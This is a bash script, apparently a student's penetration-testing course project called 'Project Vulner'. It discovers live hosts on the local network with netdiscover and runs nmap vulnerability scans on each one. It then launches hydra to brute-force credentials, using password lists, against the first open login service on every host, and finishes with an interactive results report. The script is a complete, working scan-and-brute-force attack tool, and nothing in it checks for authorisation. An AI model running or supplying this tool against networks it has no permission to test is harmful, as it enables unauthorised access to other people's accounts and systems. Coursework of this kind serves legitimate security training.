#!/bin/bash

sudo -v #To minimize sudo typing at the beginning stage (at minimum there are 2 times, namely netdiscover and nmap function)

#Project Banner
echo -e "\e[31m ____            _           _      __     __     _                 "
sleep 0.5
echo -e "\e[33m|  _ \ _ __ ___ (_) ___  ___| |_ _  \ \   / /   _| |_ __   ___ _ __ "
sleep 0.5
echo -e "\e[31m| |_) | '__/ _ \| |/ _ \/ __| __(_)  \ \ / / | | | | '_ \ / _ \ '__|"
sleep 0.5
echo -e "\e[33m|  __/| | | (_) | |  __/ (__| |_ _    \ V /| |_| | | | | |  __/ |   "
sleep 0.5
echo -e "\e[31m|_|   |_|  \___// |\___|\___|\__(_)    \_/  \__,_|_|_| |_|\___|_|   "
sleep 0.5
echo -e "\e[33m              |__/                                                  "
sleep 0.5
echo -e "\e[32mPenetration Testing Module Project"
echo -e "\e[36m"
sleep 1.5
echo "Name          		:Fransiskus Asisi Bhismobroto"
sleep 1
echo "Student Code  		:s10"
sleep 1
echo "Class Code    		:CFC090423"
sleep 1
echo "Lecturer Name 		:Loh Kar Wei"
echo -e "\e[0m"
sleep 1

#Stage I Banner
echo -e "\e[31m ____  _                     ___ "
sleep 0.5
echo -e "\e[33m/___ || |_ __ _  __ _  ___  |_ _|\e[31m"
sleep 0.5
echo -e '\___ \| __  _` |/ _`  / _ \  | | '
sleep 0.5
echo -e "\e[33m ___) | || (_| | (_| |  __/  | | "
sleep 0.5
echo -e "\e[31m|____/ \__\__,_|\__, |\___| |___|"
sleep 0.5
echo -e "\e[33m                |___/            "
sleep 0.5
echo -e "\e[32mMapping Network Devices and Open Ports"
echo -e "\e[0m"
sleep 1.5

echo "Identifying LAN network Range |||||----------|"
sleep 1
echo "Identifying LAN network Range ||||||||||-----|"
sleep 1
echo "Identifying LAN network Range ||||||||||||||||"
echo""
sleep 1

#To identify the host IP (in order to identify the LAN network range)
host_ip=$(ifconfig | grep broadcast | awk '{print $2}')
echo -e "\e[36mThe host IP is identified to be: \e[32m$host_ip\e[0m"
sleep 0.5
host_subnet_mask=$(netmask -c $host_ip)
new_host_subnet_mask=${host_subnet_mask/%32/24}
#After identifying host IP (change the format to CIDR)
#As the output of the netmask -c (identifying CIDR) is always /32, the pattern substitution is used to change it to /24
#If there are more information, this might need to be tweaked (eg. If the info gathering stage indicate the network is subnetted by different department in a company)
echo -e "\e[36mThe host Subnet Mask is identified to be: \e[32m$new_host_subnet_mask \e[0m"
echo ""
sleep 0.5

#Shortcut for formatting (aesthetic purpose only)
underline=`tput smul`
nounderline=`tput rmul`
bold=`tput bold`
normal=`tput sgr0`

function file_exist_check()
{
if [ -f $1 ]
then 
	sudo truncate -s0 $1
	echo "File $1 exists and emptied"
else 
	touch $1
	echo "File $1 created"
fi
}

echo "${underline}Performing File Checks${nounderline}"
file_exist_check raw_report 
#file_exist_check final_report
file_exist_check custom_password_list
file_exist_check host_list
file_exist_check first_login_protocol

function check_protocol()
{
for ip_num in $(cat host_list)
do
	rownum=1
	overlap_count=0
	#while [ $overlap_count -lt 1 ] 
	#This while section is meant to increment such that the identified protocol will go down the list of open port ($rownum and hence head -n increasing, but tail -n is always 1, meaning taking the last each iteration)
	#Idea abandoned as it could not work, but code is kept in case there are patch/version update in the future
	#do 
	login_protocol=$(cat raw_report | grep "/tcp open" | grep $ip_num | head -n $rownum | tail -n 1 | awk '{print $4}')
		#overlap_count=$(cat hydra_service | grep "$login_protocol" | wc -l)
		#echo ""
		#((overlap_count++))
		#if [[ $overlap_count -ge 1 ]]; then
			#break
		#fi
	#done
	echo "The first login service available for IP: $ip_num is: $login_protocol" >> first_login_protocol
done
echo "Summary of Protocol To Brute Force:"
cat first_login_protocol
}

# This section is to check if the identified range/CIDR is correct to identify the range.
function choose_subnetorcidr()
{
echo ""
echo "For Scanning and Enumeration: Is $new_host_subnet_mask the intended LAN? (y/n)"
read user_choice
case $user_choice in
Y|y)
	ip_range=$(netmask -r $new_host_subnet_mask)
	new_new_host_subnet_mask=$new_host_subnet_mask
	sleep 1
	echo ""
	sleep 2
;;
N|n)
	echo "Please indicate the LAN in the form of a CIDR"
	read input_cidr
	ip_range=$(netmask -r $input_cidr)
	new_new_host_subnet_mask=$input_cidr
	sleep 1
;;
*)
	echo "Please choose y (yes) or n (no)!"
	choose_subnetorcidr
;;
esac
}

choose_subnetorcidr

user_list_active=/home/kali/Projectpentest/topusername.txt
password_list_active=/home/kali/Projectpentest/top50pw.txt

function brute_force_console()
{
echo "
======================================================================
The Currently selected User List is: $user_list_active
The Currently selected Password List is: $password_list_active

${underline}Please choose action to be performed${nounderline}
Input A to Specify User List
Input B to Specify Password List
Input C to Create Password List
Input D to Proceed to Brute Force!
======================================================================"
read ACTION
case $ACTION in 
A|a) #2.1 Allow user to specify user list
	echo 'Option A is chosen' 
	echo 'Please Specify User List'
	read input_user_list
	user_list_active=$input_user_list
	echo "The Active User List is: $user_list_active"
	brute_force_console
;;
B|b) #2.2 Allow user to specify password list
	echo 'Option B is chosen'
	echo 'Please Specify Password List'
	read input_password_list
	password_list_active=$input_password_list
	echo "The Active User List is: $password_list_active"
	brute_force_console
;;
C|c)
	echo 'Option C is chosen'
	echo 'Opening Custom Password File via Nano text editor'
	sleep 2.5
	nano custom_password_list
	brute_force_console
;;
D|d)
	echo 'Option D is chosen'
	if [ -f hydra.restore ] # To remove hydra.restore file as it interferes with fresh scans
	then 
		sudo rm hydra.restore
		echo "hydra.restore file deleted"
	else 
		echo "No hydra.restore file identified"
	fi
	starting_bruteforce=$(date +%s)
	echo 'Initiating Brute Force Sequence '
	for ip_num in $(cat host_list)
	do
	chosen_protocol=$(cat first_login_protocol | grep $ip_num | awk '{print $NF}')
	echo "IP number is $ip_num"
	echo "Protocol is $chosen_protocol"
	hydra -L $user_list_active -P $password_list_active $ip_num -u -f $chosen_protocol >> hydra_result #2.4 If loging service is available, brute force with password list (15)
	# hydra -L $user_list_active -P $password_list_active $ip_num -u -f ftp >> hydra_result #2.4 If loging service is available, brute force with password list (15)
	cat hydra_result | while read line; do echo "$ip_num: ${line}" >> raw_report; done #3.2 Save all the results into a report (5)
	rm hydra_result
	ending_bruteforce=$(date +%s)
	time_taken_to_bruteforce=$(($ending_bruteforce-$starting_bruteforce))
	done
	#2.5 If more than one login service is available, choose the first service (10)
;;
*)
	echo "Kindly choose a valid action only:'A/B/C/D' !!!"
	sleep 1
	brute_force_console
;;
esac
}

echo -e "\e[36mThe range based on the identified subnet CIDR is: \e[32m$ip_range\e[0m" # | tee -a final_report

#1.2 Automatically Scan current LAN
echo -e "\e[36mPerforming Scanning on the current LAN: \e[32m$new_new_host_subnet_mask\e[0m"
echo ""
sleep 1
echo "---Scanning in Progress---"
echo ""
sleep 2.3
echo "The hosts available are:"
sudo netdiscover -r $new_new_host_subnet_mask -NP | grep ":" | awk '{print $1}' | tee host_list
# The grep is to include all lines with MAC number (include :) but exclude space and total host found
sleep 1.5
echo "-----Stage I Concluded-----"
sleep 2

# To create stage II marker
echo ""
echo -e "\e[31m  ____  _                     ___ ___ "
sleep 0.5
echo -e "\e[33m / ___|| |_ __ _  __ _  ___  |_ _|_ _|\e[31m"
sleep 0.5
echo -e ' \___ \| __/ _` |/ _` |/ _ \  | | | | '
sleep 0.5
echo -e "\e[33m  ___) | || (_| | (_| |  __/  | | | | "
sleep 0.5
echo -e "\e[31m |____/ \__\__,_|\__, |\___| |___|___|"
sleep 0.5
echo -e "\e[33m                 |___/                "
sleep 0.5                                     
echo -e "\e[32mVulnerability Scan and Brute Force Attempt"
sleep 0.5
echo -e "\e[31m${bold}May the Brute Force be with you!${nobold}"
echo -e "\e[0m"

# This part is the (main) FOR LOOP, where iterating through each host, nmap enumeration and vulnerability scan is performed
# The output is directed to raw_report (to be processed later) 

starting_scan=$(date +%s) # 

for ip_num in $(cat host_list)
do
	echo ""
	echo "$ip_num Scanning Commences!"
	sudo nmap --script vuln -sV $ip_num -oN ip_tmp #-p-
		#1.3 Enumerate each live host
		#1.4 Find Potential Vulnerabilities for each device: via --script vuln
	#sudo masscan -pU:1-65535 $ip_num # Switch on if masscan is required
	cat ip_tmp | while read line; do echo "$ip_num: ${line}" >> raw_report; done #3.2 Save all the results into a report (5)
	sudo rm ip_tmp
done

echo ""
echo -e "${underline}Enumeration and Scanning Done${nounderline}"
ending_scan=$(date +%s)
time_taken_to_scan=$(($ending_scan-$starting_scan))
echo ""
echo "Checking the First Available Protocol for Brute Force Stage"
sleep 3
check_protocol
echo ""
brute_force_console

# To create stage III marker
echo "-----Stage II Concluded-----"
sleep 2
echo ""
echo -e "\e[31m ____  _                     ___ ___ ___ "
sleep 0.5
echo -e "\e[33m/ ___|| |_ __ _  __ _  ___  |_ _|_ _|_ _|\e[31m"
sleep 0.5
echo -e '\___ \| __/ _` |/ _` |/ _ \  | | | | | | '
sleep 0.5
echo -e "\e[33m ___) | || (_| | (_| |  __/  | | | | | | "
sleep 0.5
echo -e "\e[31m|____/ \__\__,_|\__, |\___| |___|___|___|"
sleep 0.5
echo -e "\e[33m                |___/                    "
sleep 0.5
echo -e "\e[32mReporting and Analysis"
echo -e "\e[0m"
sleep 1.5

#3.1 Display general statistics (time of scan, number of found devices, etc)
echo -e "\e[32mDisplaying General Statistics\e[36m"
host_count=$(cat host_list | wc -l)
echo -e "\e[36mThe Scanned CIDR is: \e[32m$new_new_host_subnet_mask"
echo -e "\e[36mNumber of Hosts found: \e[32m$host_count " # | tee -a final_report
echo -e "\e[36mThe range based on the identified subnet CIDR is: \e[32m$ip_range\e[0m" # | tee -a final_report
scantime_converted=$(printf '%02dh:%02dm:%02ds\n' $((time_taken_to_scan/3600)) $((time_taken_to_scan%3600/60)) $((time_taken_to_scan%60)))
bftime_converted=$(printf '%02dh:%02dm:%02ds\n' $((time_taken_to_bruteforce/3600)) $((time_taken_to_bruteforce%3600/60)) $((time_taken_to_bruteforce%60)))
echo -e "\e[36mTotal Time taken for enumeration and scanning: \e[32m$scantime_converted\e[0m" # | tee -a final_report
echo -e "\e[36mTotal Time taken to brute force: \e[32m$bftime_converted\e[0m" # | tee -a final_report
count_tcp_port_open=$(cat raw_report | grep "/tcp open" | wc -l)
echo -e "\e[36mThe TOtal Number of Open TCP ports in the network are: \e[32m$count_tcp_port_open\e[0m" # | tee -a final_report

function choose_ip_to_display() #3.3 Allow the user to enter IP address, display the relevant findings
{
echo "
======================================================================
${underline}Report Preparation Stage${nounderline}
Currently selected IP: $ip_active_result

${underline}Please choose action to be performed${nounderline}
Input A to Show the results for selected IP
Input B to Change Selected IP
Input C to Look at Available IP
Input D to Terminate Project Vulner
======================================================================"
read ACTION
case $ACTION in 
A|a)
	echo "Showing results for $ip_active_result"
	cat raw_report | grep $ip_active_result | cut -f2- -d ':'
	choose_ip_to_display 
;;
B|b)
	echo "Please input the IP for which result will be displayed"
	read chosen_ip_result
	ip_active_result=$chosen_ip_result
	echo "Please input the IP to display the result for"
	choose_ip_to_display
;;
C|c)
	echo "Please input the IP to display the result for"
	echo "The information available are for the IPs below:"
	cat host_list
	choose_ip_to_display
;;
D|d)
	echo "Cleaning up temporary documents"
	echo "Terminating Project Vulner |||||----------|"
	sleep 1
	echo "Terminating Project Vulner ||||||||||-----|"
	sleep 1
	echo "Terminating Project Vulner ||||||||||||||||"
	sleep 1
	exit
;;
*)
	echo "Kindly choose a valid action only:'A/B/C/D' !!!"
	sleep 1
	choose_ip_to_display
;;
esac
}

ip_active_result=$(cat host_list | tail -n 2 | head -n 1) 
# Take the second last enumerated IP (as default) considering it is unlikely network/DNS Server/Default Gateway
choose_ip_to_display

#Hex Color for report (font:187,188,191; background:35,37,46)
#-------------------- ||||| End of Script ||||| -----------------------------
#V2l0aCBlbm91Z2ggdGltZSBub3RoaW5nIGlzIHVuaGFja2FibGU=
#TWF5IHRoZSBCcnV0ZSBGb3JjZSBiZSB3aXRoIHlvdQ==